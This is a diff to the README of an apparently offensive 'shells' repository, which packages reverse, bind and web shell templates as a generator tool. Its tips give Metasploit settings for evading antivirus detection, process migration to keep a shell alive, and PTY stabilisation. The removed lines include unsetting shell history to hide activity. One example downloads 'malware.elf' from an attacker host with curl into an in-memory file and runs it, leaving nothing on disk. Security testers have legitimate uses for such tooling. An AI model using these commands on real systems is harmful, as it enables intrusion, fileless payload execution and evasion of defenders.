@@ -1,43 +1,57 @@
 # Shells
 
-> A collection of reverse, bind and web shells from all over the internet.
+![Demo](./assets/demo.gif)
 
-Spotlight:
+A collection of reverse, bind and web shells from all over the internet.
 
-- [TCP reverse shell in C++ as Windows DLL](./reverse/connector/windows-cpp/)
-- [TCP reverse shell with Cosmopolitan Libc](./reverse/connector/cosmopolitan/)
-- [TCP reverse shell in Go](./reverse/connector/golang/)
-- [Reverse shell listener with Tmux and Socat](./reverse/listener/tmux-socat-multiplexer/)
-- [Python dropper utilizing `memfd_create()` on Linux](./dropper/memfd-create.py)
-- [Python dropper that jumps to shellcode on Linux](./dropper/mmap-ctype.py)
+## Setup
+
+a) With [pipx](https://github.com/pypa/pipx).
+
+~~~ bash
+pipx install git+https://github.com/dadevel/shells.git@main
+~~~
+
+b) With `pip`.
+
+~~~ bash
+pip install --user git+https://github.com/dadevel/shells.git@main
+~~~
 
 ## Usage
 
-To interactively select and render one of the many templates run `./make.py`.
+Just run `genshell` and select one of the many templates.
+
+Some advanced templates require manual steps:
+
+- [TCP reverse shell in C++ as Windows DLL](./genshell/templates/reverse/connector/windows-cpp/)
+- [TCP reverse shell with Cosmopolitan Libc](./genshell/templates/reverse/connector/cosmopolitan/)
+- [TCP reverse shell in Go](./genshell/templates/reverse/connector/golang/)
+- [Reverse shell listener with Tmux and Socat](./genshell/templates/reverse/listener/tmux-socat-multiplexer/)
+- [Python ELF loader via `memfd_create()` on Linux](./genshell/templates/exec/memfd-create.py)
+- [Python shellcode loader on Linux](./genshell/templates/exec/mmap-ctype.py)
 
 ## Tips
 
 ### Metasploit
 
-List available payload formats with `msfvenom --list formats`.
-
 Payloads like `windows/shell_reverse_tcp` are one of the few reverse shells for Windows that support interactive commands.
 
-Evade basic AV detection with `windows/meterpreter/reverse_http` ([source](https://twitter.com/lpha3ch0/status/1630213398397874178)):
+Evade basic detections when using Meterpreter.
+After you received the connection run `load stdapi` ([source](https://twitter.com/lpha3ch0/status/1630213398397874178)).
 
 ~~~
+set Payload windows/meterpreter/reverse_http
 set EnableStageEncoding true
 set StageEncoder x86/shikata_ga_nai
 set AutoLoadStdapi false
 ~~~
 
-After you received the meterpreter shell run `load stdapi`.
-
-When your shell terminates shortly after you receive the connection run `migrate -N explorer.exe` in the meterpreter shell or `set AutoRunScript post/windows/manage/migrate` for the handler.
+When your shell terminates shortly after you receive the connection run `migrate -N explorer.exe` in the meterpreter shell or `set AutoRunScript post/windows/manage/migrate` on the handler.
 
 ### Linux PTY
 
-Spawn a PTY and stabilize your shell.
+Spawn a PTY and stabilize your shell with Python.
 
 ~~~ bash
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -46,13 +60,9 @@ echo "stty sane;stty rows $LINES cols $COLUMNS;export TERM=xterm;" | xclip -sel 
 stty raw -echo
 fg
 # paste clipboard
-# optional: disable history
-unset HISTFILE
-# optional: reset prompt
-export PS1="$HOSTNAME> "; unset PROMPT_COMMAND
 ~~~
 
-Alternate technique to spawn a PTY.
+Alternatively spawn a PTY with `script`.
 
 ~~~ bash
 script -q -c /bin/bash /dev/null
@@ -60,15 +70,16 @@ script -q -c /bin/bash /dev/null
 
 ### Linux memfd_create()
 
-Create file in memory with Python 3.8 or newer ([source](https://twitter.com/David3141593/status/1629691758563975168)).
+Create file in memory with Python 3.8 or newer ([source](https://twitter.com/randomdude999_/status/1629875560401780736)).
 
-~~~ python
-import os
-os.fork() or (os.setsid(), print(f'/proc/{os.getpid()}/fd/{os.memfd_create(str())}'), os.kill(os.getpid(), 19))
+~~~
+$ python3 -c "from os import*;fork()or(setsid(),print(f'/proc/{getpid()}/fd/{memfd_create(sep)}'),kill(0,19))"
+/proc/139856/fd/3
+$ curl -o /proc/139856/fd/3 https://attacker.com/malware.elf
+$ /proc/139856/fd/3
 ~~~
 
-~~~ bash
-path="$(python3 -c "from os import*;fork()or(setsid(),print(f'/proc/{getpid()}/fd/{memfd_create(sep)}'),kill(0,19))")"
-curl -o $path https://attacker.com/malware.elf
-$path
-~~~
+### Other interesting tools
+
+- [Kraken](https://github.com/kraken-ng/kraken), multi-language webshell
+- [xc](https://github.com/xct/xc), reverse shell for Linux and Windows written in Go
